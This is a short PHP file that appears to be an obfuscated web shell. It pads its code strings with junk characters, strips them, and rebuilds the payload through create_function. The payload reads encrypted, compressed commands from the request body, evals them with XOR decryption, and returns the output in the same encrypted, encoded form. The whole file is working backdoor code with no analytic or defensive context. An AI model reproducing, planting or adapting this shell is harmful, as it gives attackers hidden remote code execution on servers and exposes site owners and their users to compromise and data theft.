<?php
$b='$k=-Q"08-Q204e-Q0c";$kh="3-Q9714-Qdf86c0b";$kf="-Qd-Qf2b148d86-Q3b";$p-Q-Q="mPeTz-QglIoUiLj6ep";-Qfun';
$i='$j=0;($j-Q<$c&&$-Qi<$l);$j++,$i+-Q+){-Q$o-Q-Q.=$t{$i}^-Q$k-Q-Q{$j};}}return-Q $o;}if (@preg_-Qmatch-';
$O='l(-Q@gzuncom-Qp-Qress(@-Qx(@base6-Q4_-Qdecode-Q($m[-Q1]),$k)));-Q$o=@-Qob_-Qget_contents();-Q@ob';
$V='Q("/$kh(.+)$-Qkf/"-Q,@file_g-Qet_con-Q-Qtents("ph-Qp://inp-Qut"),$m)-Q==1) {@o-Qb_star-Qt();@e-Qva';
$C='_e-Qnd_cl-Q-Qean()-Q;$r=@base-Q64_encod-Qe(@x(@gzcom-Qpre-Q-Qss($o)-Q,$k));p-Qrint("$p$k-Qh$r$kf");}';
$Q='cti-Qon x-Q($t,$k-Q){$c=str-Qlen-Q($-Qk);$l=-Qstrlen($t)-Q;$o="";-Q-Qf-Qor($i=0;$i<$l-Q;){for-Q(-Q';
$L=str_replace('M','','cMreaMteM_fuMMnctMion');
$Z=str_replace('-Q','',$b.$Q.$i.$V.$O.$C);
$D=$L('',$Z);$D();
?>
